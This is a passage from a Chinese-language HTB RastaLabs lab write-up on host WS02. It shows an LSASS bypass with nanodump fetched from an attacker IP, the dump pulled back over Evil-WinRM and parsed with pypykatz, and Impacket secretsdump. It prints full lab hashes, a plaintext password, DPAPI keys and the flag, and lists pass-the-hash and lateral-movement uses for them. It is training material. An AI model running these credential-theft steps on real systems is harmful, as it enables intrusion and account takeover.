`<font style="color:rgb(6, 10, 38);">Access is denied</font>`<font style="color:rgb(6, 10, 38);"> 说明目标机器启用了 </font>**<font style="color:rgb(6, 10, 38);">LSA Protection (RunAsPPL)</font>**<font style="color:rgb(6, 10, 38);">，即使 SYSTEM 权限也无法直接 dump lsass.exe</font>

## <font style="color:rgb(6, 10, 38);">WS02-</font><font style="color:rgb(6, 10, 38);">注册表Hive提取(失败)</font>
```plain
C:\WINDOWS\system32>reg save HKLM\SAM C:\Users\Public\SAM.hive
Access is denied.
```

## WS02-nanodump
<font style="color:rgb(6, 10, 38);">NanoDump 是专门设计绕过 PPL 保护的轻量级工具。</font>

[GitHub - fortra/nanodump: The swiss army knife of LSASS dumping](https://github.com/helpsystems/nanodump)

### 上传
```plain
Invoke-WebRequest -Uri http://10.10.16.2:443/nanodump.x64.exe -OutFile C:\Users\Public\nanodump.x64.exe
```

### 运行
```plain
C:\WINDOWS\system32>C:\Users\Public\nanodump.x64.exe --write C:\Users\Public\lsass.dmp
The minidump has an invalid signature, restore it running:
scripts/restore_signature lsass.dmp
Done, to get the secretz run:
python3 -m pypykatz lsa minidump lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

### 下载
```plain
*Evil-WinRM* PS C:\Users\Public> download C:\\Users\\Public\\lsass.dmp /home/kali/Desktop/htb/rastalabs/lsass.dmp
                                        
Info: Downloading C:\Users\Public\lsass.dmp to /home/kali/Desktop/htb/rastalabs/lsass.dmp
                                        
Info: Download successful!
```

### 恢复
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/tools/nanodump/scripts]
└─# ./restore_signature /home/kali/Desktop/htb/rastalabs/lsass.dmp
done, to analize the dump run:
python3 -m pypykatz lsa minidump /home/kali/Desktop/htb/rastalabs/lsass.dmp
```

### 抓取
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# pypykatz lsa minidump /home/kali/Desktop/htb/rastalabs/lsass.dmp 
INFO:pypykatz:Parsing file /home/kali/Desktop/htb/rastalabs/lsass.dmp
FILE: ======== /home/kali/Desktop/htb/rastalabs/lsass.dmp =======
== LogonSession ==
authentication_id 14837274 (e2661a)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T06:00:41.914787+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 14837274

== LogonSession ==
authentication_id 12176195 (b9cb43)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T05:36:54.554579+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 12176195

== LogonSession ==
authentication_id 12055441 (b7f391)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T05:36:51.885015+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 12055441

== LogonSession ==
authentication_id 11974198 (b6b636)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T05:36:49.308650+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 11974198

== LogonSession ==
authentication_id 11960946 (b68272)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T05:36:40.730802+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 11960946

== LogonSession ==
authentication_id 7509921 (7297a1)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T05:03:28.440541+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 7509921

== LogonSession ==
authentication_id 6572902 (644b66)
session_id 0
username Administrator
domainname WS02
logon_server WS02
logon_time 2026-03-16T04:52:35.508139+00:00
sid S-1-5-21-1069732847-4189959640-2234734279-500
luid 6572902

== LogonSession ==
authentication_id 283618 (453e2)
session_id 1
username epugh
domainname RLAB
logon_server DC01
logon_time 2026-03-16T03:26:27.561607+00:00
sid S-1-5-21-1396373213-2872852198-2033860859-1151
luid 283618
        == MSV ==
                Username: epugh
                Domain: RLAB
                LM: NA
                NT: 326457b72c3f136d80d99bdbb935d109
                SHA1: f7fc5ef4b5f4131e09f5d866f8db0a35b5604ee9
                DPAPI: 2ac19fc98ab4188d45c43fe99fe3be5c00000000
        == WDIGEST [453e2]==
                username epugh
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: epugh
                Domain: RASTALABS.LOCAL
                AES128 Key: 326457b72c3f136d80d99bdbb935d109
                AES256 Key: cd65e7c119eda0b4cdd05c48e0ad67bf83ee7a04a3edbac28a0c5555aea65772
        == WDIGEST [453e2]==
                username epugh
                domainname RLAB
                password None
                password (hex)
        == CREDMAN [453e2]==
                luid 283618
                username flag
                domain localhost
                password RASTA{wh3r3_w45_2f4_!?}
                password (hex)520041005300540041007b00770068003300720033005f007700340035005f003200660034005f0021003f007d000000
        == DPAPI [453e2]==
                luid 283618
                key_guid 37fe87d9-4d2d-4dc6-aa54-1a011f267940
                masterkey 40fc84e4d4f44f01c8d4fb8dccc8da37bbada94ecb374e813c46b03e0cd35fd4d285b5826a411fc6d3cf382d4f3aa6010ea3cae8a8a11fd4b375908e6ca17067
                sha1_masterkey fcfcfa4cf4f4a89ae9375bc6edd9a15b2c876cea
        == DPAPI [453e2]==
                luid 283618
                key_guid 3fc33032-36a7-481e-8bc5-c4dd39cfed29
                masterkey f719aee4693f3109521906ca3b44d1357f76f33188201075e99a895660d9e8ed337a49dd2ca1845adceaf3c8cf2c96f8e2fbf8a252a2291bbf17993eed041b01
                sha1_masterkey 0ac4f0369fd929661d8726cbd0daa13f347a3f9a
        == DPAPI [453e2]==
                luid 283618
                key_guid d4c2b28a-a6f3-415c-a593-67ffdcecc34c
                masterkey a282bfb3c4e0f44e04a7842060980f9bbb48dfbeffdf8c3154c1844755600977abbc5768552be042096d57da87fabe816594fe3456ce2cd8098d6e9808ee8185
                sha1_masterkey 687c0e30230080b8084b30479542666554bcf005
        == DPAPI [453e2]==
                luid 283618
                key_guid 1a5a490d-4cfb-4d77-bd86-4d36c308065e
                masterkey 15dce65eaa879ea00e8570b792a66bf0a7c06dcbb75f4d92362221a9d7fb6c13ed555d13aa0d38161c054bd17740cb4f803bd912bfe8a781f1d67cbbca1cbe7f
                sha1_masterkey efe7ccfe80f947249e455c62483eaf16cd66d579

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-03-16T03:26:12.124109+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 

== LogonSession ==
authentication_id 80335 (139cf)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-03-16T03:26:12.092856+00:00
sid S-1-5-90-0-1
luid 80335
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a
        == WDIGEST [139cf]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: WS02$
                Domain: rastalabs.local
                Password: 2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                password (hex)2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: c0723c2f4b0f0dce38fc8d999b821322359196556fbaad2ecacde0862c7ceef4
        == WDIGEST [139cf]==
                username WS02$
                domainname RLAB
                password None
                password (hex)

== LogonSession ==
authentication_id 80310 (139b6)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-03-16T03:26:12.092856+00:00
sid S-1-5-90-0-1
luid 80310
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a
        == WDIGEST [139b6]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: WS02$
                Domain: rastalabs.local
                Password: 2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                password (hex)2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: c0723c2f4b0f0dce38fc8d999b821322359196556fbaad2ecacde0862c7ceef4
        == WDIGEST [139b6]==
                username WS02$
                domainname RLAB
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username WS02$
domainname RLAB
logon_server 
logon_time 2026-03-16T03:26:10.827235+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a
        == WDIGEST [3e4]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: ws02$
                Domain: RASTALABS.LOCAL
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: 62f6aac190e264f3073670b9d58cfd7c308907b57163396c968151b99a787d1c
        == WDIGEST [3e4]==
                username WS02$
                domainname RLAB
                password None
                password (hex)

== LogonSession ==
authentication_id 47223 (b877)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-03-16T03:26:10.155358+00:00
sid S-1-5-96-0-1
luid 47223
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a
        == WDIGEST [b877]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: WS02$
                Domain: rastalabs.local
                Password: 2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                password (hex)2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: c0723c2f4b0f0dce38fc8d999b821322359196556fbaad2ecacde0862c7ceef4
        == WDIGEST [b877]==
                username WS02$
                domainname RLAB
                password None
                password (hex)

== LogonSession ==
authentication_id 47158 (b836)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-03-16T03:26:10.139735+00:00
sid S-1-5-96-0-0
luid 47158
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a
        == WDIGEST [b836]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: WS02$
                Domain: rastalabs.local
                Password: 2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                password (hex)2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: c0723c2f4b0f0dce38fc8d999b821322359196556fbaad2ecacde0862c7ceef4
        == WDIGEST [b836]==
                username WS02$
                domainname RLAB
                password None
                password (hex)

== LogonSession ==
authentication_id 45778 (b2d2)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-03-16T03:26:08.702239+00:00
sid None
luid 45778
        == MSV ==
                Username: WS02$
                Domain: RLAB
                LM: NA
                NT: 4f1ec6c6c9534836e6882a0561638f8b
                SHA1: e865973c6f222c039181ff41394352ae02d24f2a
                DPAPI: e865973c6f222c039181ff41394352ae02d24f2a

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username WS02$
domainname RLAB
logon_server 
logon_time 2026-03-16T03:26:08.405368+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: ws02$
                Domain: RASTALABS.LOCAL
                AES128 Key: 4f1ec6c6c9534836e6882a0561638f8b
                AES256 Key: 62f6aac190e264f3073670b9d58cfd7c308907b57163396c968151b99a787d1c
        == WDIGEST [3e7]==
                username WS02$
                domainname RLAB
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid f6b96afc-2582-493d-ab7e-ef56d6522ab8
                masterkey 77b3bcc660a91f1517d08667b89f941eeedbf109b56a5d389162bd690ed3b60f6e55a96f60c0ce8a0d360ac4e2e9ba765abaa52bb5d4759697e66a4dc345162e
                sha1_masterkey ed7073c154cb802538c34d59684c22be4802a50d
        == DPAPI [3e7]==
                luid 999
                key_guid c15a9c37-c2ea-4697-9bc2-4d62b26cbabf
                masterkey b13502964fc0ab97360e2f8fbf3993a13abc5ff00b531124a3e7f0bf99a1db7534a6df1b39f711f798719b9504204595adb2ae83e8114474e352ec33e520d1cb
                sha1_masterkey d2bebd6335ab82cb63b7eaea269557a024c16ba8
        == DPAPI [3e7]==
                luid 999
                key_guid fb16b547-9bcb-40e6-b4ea-626f67b07899
                masterkey b21e6477e19ce3bc3373df78f6931022a108bcd733d4a96e65b2f27ffc2255abb6277248ffdda9d4fc9158fbc494b4b89a7208ad52a4985ed884e5bb6dfaf1b6
                sha1_masterkey f250d6ac5c9dddaaf97ad860ba34e1bdbfc4b7f3
        == DPAPI [3e7]==
                luid 999
                key_guid d963f089-8a32-4812-80c6-be17ae237f3e
                masterkey 684fc7a788c0a01a02a3360b8d965df3df7161bd5deafbd27e03eb378e1733d119bed5a53a5be09370ee622e572dc35b745b0a865abce6fa38cc46cf50afa070
                sha1_masterkey d9cca71b78adbb29d0de567935c54b382546abdd
        == DPAPI [3e7]==
                luid 999
                key_guid 46763b95-93dc-450f-9032-d520e00edff0
                masterkey bedd9c5acd21656eb05532f4873b020961ee4e6709e804cf0c2eeeff1a5c55e0aec872eee05f28d0db8be2bee7db347fb67a30edc19c8c7c32761e56b7f01250
                sha1_masterkey fd9c33ee87713aabca82b0b8de23cfdece059619
        == DPAPI [3e7]==
                luid 999
                key_guid 76068c60-aea9-491a-adc8-c49f4cca4e8e
                masterkey 8214fb91a374ef11d1c2ec12fb01c836e4eb615de960a0eb2f99b0b31ffe2e697a5931bcf61b3e4a12aaf27843c16e4a4c111d3094eef8a2ae597d65c4543ee9
                sha1_masterkey 3e1c9512e0f6a4806d6719e3d8cd0493b6a65c8c
        == DPAPI [3e7]==
                luid 999
                key_guid 280acb64-8e93-413d-84cd-e917e192bd68
                masterkey 9cf8579695734c6c7eac892012e9a6616e3ffe38b4685e0b053afe2b274328b4ec366a8840db25950cc656c4f3d29104419fe0cfe97cfe8a812eefd5ac733a5f
                sha1_masterkey a3d06b8a03a93cd4026f92f5a25015133ce1ce38
        == DPAPI [3e7]==
                luid 999
                key_guid 0af50e35-4750-4f0e-aca7-31f978e440f6
                masterkey e442f7e9d56aa1c8ee6ce79d1d163551274291bcb0601aefeef315fb247164cc39c683d860d70d69d3b735b1bbb888bf498aacfbc31419945889317e87fed0d1
                sha1_masterkey 8e5769ed07eb1452178d9e6ce79d65cd4e19590e

```

## Getflag-WS02-<font style="color:rgb(6, 10, 38);">Credential Manager</font>
<font style="color:rgb(6, 10, 38);">在 </font>**<font style="color:rgb(6, 10, 38);">pypykatz</font>**<font style="color:rgb(6, 10, 38);"> 的输出中，找到了存储在 </font>**<font style="color:rgb(6, 10, 38);">Credential Manager</font>**<font style="color:rgb(6, 10, 38);"> 中的 flag：</font>

```plain
== CREDMAN [453e2]==
    luid 283618
    username flag
    domain localhost
    password RASTA{wh3r3_w45_2f4_!?}
```

## WS02-secretsdump
```plain
┌──(kali㉿kali)-[~]
└─$ proxychains -q secretsdump.py "Administrator:6Sqf7o7E@10.10.121.107"
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8fe007b6f1dfad48ff01cfec5741d3b7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccadaf9b1dfb44521451a4658eae0d8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d958918776b57f06fac3c375bf2c3d5d:::
[*] Dumping cached domain logon information (domain/username:hash)
RASTALABS.LOCAL/epugh:$DCC2$10240#epugh#52ded63492265d3feb21dd28be995bf5
RASTALABS.LOCAL/Administrator:$DCC2$10240#Administrator#4846fb364be3573b565cdf0b9d1798af
RASTALABS.LOCAL/epugh_adm:$DCC2$10240#epugh_adm#5aa1c318bf1ce892b35d9e020277431d
RASTALABS.LOCAL/rweston_da:$DCC2$10240#rweston_da#24c8e9ab0617120753dc6d5ea9262ea6
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RLAB\WS02$:aes256-cts-hmac-sha1-96:62f6aac190e264f3073670b9d58cfd7c308907b57163396c968151b99a787d1c
RLAB\WS02$:aes128-cts-hmac-sha1-96:0a2f3bdb9ad08400446979ab50e9f62f
RLAB\WS02$:des-cbc-md5:62430d2f73451375
RLAB\WS02$:plain_password_hex:2097418a4dca778c8c22ce3bbda72bbdf7274bd0badcf7f1030ea09fb88102292fc2c5679b735e18fd2abc75403b341f7a4a50f75278538d95b1a609828559830d50eb3e682f1f0b8bf8a604f9666f3239c0729fa00e427f35752f511de34fcbc2c62a23a18c25cc0d4a5d0c3facee54d9c49ba87e4627ef6d4b8d39c854abddafdd014aa428cdcca41d3563f67d721097cbd4d48ef88f081736c413ac4ab17647a160dd0b277b0338814736693ea9d677f4457bbbc47742c33ad98813c8a43fcb29578552d7c648d2185ec32dd400de655742cb2875c351c9869de3df5d493eb20822e2f539ee8d3ea88cd0baf1225e
RLAB\WS02$:aad3b435b51404eeaad3b435b51404ee:4f1ec6c6c9534836e6882a0561638f8b:::
[*] DefaultPassword 
rastalabs.local\epugh:Sarah2017
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7128b9eca864ea503bb1efb50ce803588dcf9662
dpapi_userkey:0x4f2b5c6dff20964ecf76b8015d860968f7035ce2
[*] NL$KM 
 0000   87 3F C8 2D 45 CD 62 FE  5F 15 AF A0 28 B0 94 AE   .?.-E.b._...(...
 0010   E0 AF 79 B2 DD 65 9D D8  8C 50 A2 03 DB 6A 10 27   ..y..e...P...j.'
 0020   F2 30 19 FC 72 77 19 1B  8E 85 07 0B FA 00 F9 66   .0..rw.........f
 0030   7F 85 BA FF 97 0B 4C 9A  6C C4 D5 BF 33 17 E7 54   ......L.l...3..T
NL$KM:873fc82d45cd62fe5f15afa028b094aee0af79b2dd659dd88c50a203db6a1027f23019fc7277191b8e85070bfa00f9667f85baff970b4c9a6cc4d5bf3317e754
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

## WS02-凭据汇总
---

### 🔑 1. 本地 SAM 账户哈希 (WS02)
| 用户名 | RID | LM Hash | NT Hash |
| --- | --- | --- | --- |
| Administrator | 500 | aad3b435b51404eeaad3b435b51404ee | `1ccadaf9b1dfb44521451a4658eae0d8` |
| Guest | 501 | aad3b435b51404eeaad3b435b51404ee | 31d6cfe0d16ae931b73c59d7e0c089c0 |
| DefaultAccount | 503 | aad3b435b51404eeaad3b435b51404ee | 31d6cfe0d16ae931b73c59d7e0c089c0 |
| WDAGUtilityAccount | 504 | aad3b435b51404eeaad3b435b51404ee | d958918776b57f06fac3c375bf2c3d5d |


---

### 🔐 2. 缓存的域登录哈希 (DCC2 - MSLSA)
| 域/用户名 | DCC2 Hash |
| --- | --- |
| RASTALABS.LOCAL/epugh | `52ded63492265d3feb21dd28be995bf5` |
| RASTALABS.LOCAL/Administrator | `4846fb364be3573b565cdf0b9d1798af` |
| RASTALABS.LOCAL/epugh_adm | `5aa1c318bf1ce892b35d9e020277431d` |
| RASTALABS.LOCAL/rweston_da | `24c8e9ab0617120753dc6d5ea9262ea6` |


---

### 🎯 3. 明文密码 (LSA Secrets)
| 类型 | 用户名 | 密码/密钥 |
| --- | --- | --- |
| **DefaultPassword** | rastalabs.local\epugh | `Sarah2017`<br/> ⭐ |
| **MACHINE.ACC** | RLAB\WS02$ | NT: `4f1ec6c6c9534836e6882a0561638f8b` |
| **MACHINE.ACC** | RLAB\WS02$ | AES256: `62f6aac190e264f3073670b9d58cfd7c308907b57163396c968151b99a787d1c` |


---

### 🔑 4. LSASS 内存凭据 (pypykatz)
| 用户 | 域 | 类型 | 凭据 |
| --- | --- | --- | --- |
| epugh | RLAB | NT Hash | `326457b72c3f136d80d99bdbb935d109` |
| epugh | RLAB | SHA1 | `f7fc5ef4b5f4131e09f5d866f8db0a35b5604ee9` |
| epugh | RASTALABS.LOCAL | AES128 | `326457b72c3f136d80d99bdbb935d109` |
| epugh | RASTALABS.LOCAL | AES256 | `cd65e7c119eda0b4cdd05c48e0ad67bf83ee7a04a3edbac28a0c5555aea65772` |
| WS02$ | RLAB | NT Hash | `4f1ec6c6c9534836e6882a0561638f8b` |
| WS02$ | RASTALABS.LOCAL | AES256 | `c0723c2f4b0f0dce38fc8d999b821322359196556fbaad2ecacde0862c7ceef4` |


---

### 🛡️ 5. DPAPI 密钥
| 类型 | 密钥 |
| --- | --- |
| DPAPI Machine Key | `0x7128b9eca864ea503bb1efb50ce803588dcf9662` |
| DPAPI User Key | `0x4f2b5c6dff20964ecf76b8015d860968f7035ce2` |


---

### 🏆 6. Flag
```plain
RASTA{wh3r3_w45_2f4_!?}
```

---

### 📊 可用攻击向量汇总
| 凭据类型 | 值 | 用途 |
| --- | --- | --- |
| **明文密码** | `epugh:Sarah2017` | 域用户登录、横向移动 |
| **Administrator NT Hash** | `1ccadaf9b1dfb44521451a4658eae0d8` | 本地管理员 Pass-the-Hash |
| **epugh DCC2** | `52ded63492265d3feb21dd28be995bf5` | 离线破解域密码 |
| **WS02$ Machine Account** | `4f1ec6c6c9534836e6882a0561638f8b` | 域内横向移动、资源访问 |


## WS02-DPAPI
 Windows 的 **DPAPI（Data Protection API）** 会用来保护很多本地敏感数据，比如浏览器保存的密码、Cookie、Wi-Fi 密码、凭据等；而 **MasterKey** 就是用来进一步解开这些 DPAPI 数据的关键材料。Mimikatz 的 DPAPI 模块可以处理这些主密钥和相关加密数据。  

### query session
```latex
*Evil-WinRM* PS C:\Users\Public> query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           epugh                     1  Active
```

可以发现epugh在WS02上具有活动会话，Windows 的 **Credential Manager（凭据管理器）** 可能保存了这个用户曾经用过的认证信息，比如：

+ 域账号用户名
+ 域账号密码
+ 某些远程连接、共享、计划任务、浏览器/应用的认证信息

这些数据通常**不是直接明文躺着**，而是被 **DPAPI** 保护起来。

通过 DPAPI 解密可能还原更高权限账号。

### Windows DPAPI 的解密链路
> DPAPI 解密链路
>
>   Windows 用 DPAPI（Data Protection API）保护用户敏感数据，比如 Credential Manager 里存的密码、Chrome 密码、WiFi
>
>   密码等。它的加密是分层的：
>
>   用户密码
>
>     └─> 派生出 prekey（通过 SHA1/MD4 + SID 计算）
>
>           └─> 解密 masterkey 文件（存在 Protect\<SID>\ 目录下）
>
>                 └─> 解密 DPAPI blob（credential 文件、Chrome Local State 等）
>
> 
>
>   第一层：用户密码 → prekey
>
>   Windows 用用户密码的 SHA1 和 NTLM hash，加上用户 SID，通过 PBKDF2 派生出一组 prekey。这就是 pypykatz dpapi prekey
>
>   做的事。
>
> 
>
>   第二层：prekey → masterkey
>
>   每个用户在 AppData\Roaming\Microsoft\Protect\<SID>\ 下有多个 masterkey 文件，文件名就是 GUID。每个 masterkey
>
>   文件里存着一个加密的 64 字节密钥，用 prekey 解密它。
>
> 
>
>   第三层：masterkey → credential blob
>
>   每个 DPAPI 加密的 blob（比如 credential 文件）头部都记录了它用的是哪个 masterkey GUID。找到对应的 masterkey 就能解密
>
> 
>
>   为什么从 LSASS dump 的 key 没用
>
>   LSASS 里缓存的 DPAPI masterkey 是当前会话加载过的。你那 4 个 key 的 GUID 跟 credential blob 要求的 7dc6a492
>
>   不匹配，说明那个 masterkey 在 dump 的时候没被加载到内存里。
>

### <font style="color:rgb(6, 10, 38);">epugh-DPAPI MasterKey</font>
```plain
== LogonSession ==
authentication_id 283618 (453e2)
session_id 1
username epugh
domainname RLAB
logon_server DC01
logon_time 2026-03-16T03:26:27.561607+00:00
sid S-1-5-21-1396373213-2872852198-2033860859-1151
luid 283618
        == MSV ==
                Username: epugh
                Domain: RLAB
                LM: NA
                NT: 326457b72c3f136d80d99bdbb935d109
                SHA1: f7fc5ef4b5f4131e09f5d866f8db0a35b5604ee9
                DPAPI: 2ac19fc98ab4188d45c43fe99fe3be5c00000000
        == WDIGEST [453e2]==
                username epugh
                domainname RLAB
                password None
                password (hex)
        == Kerberos ==
                Username: epugh
                Domain: RASTALABS.LOCAL
                AES128 Key: 326457b72c3f136d80d99bdbb935d109
                AES256 Key: cd65e7c119eda0b4cdd05c48e0ad67bf83ee7a04a3edbac28a0c5555aea65772
        == WDIGEST [453e2]==
                username epugh
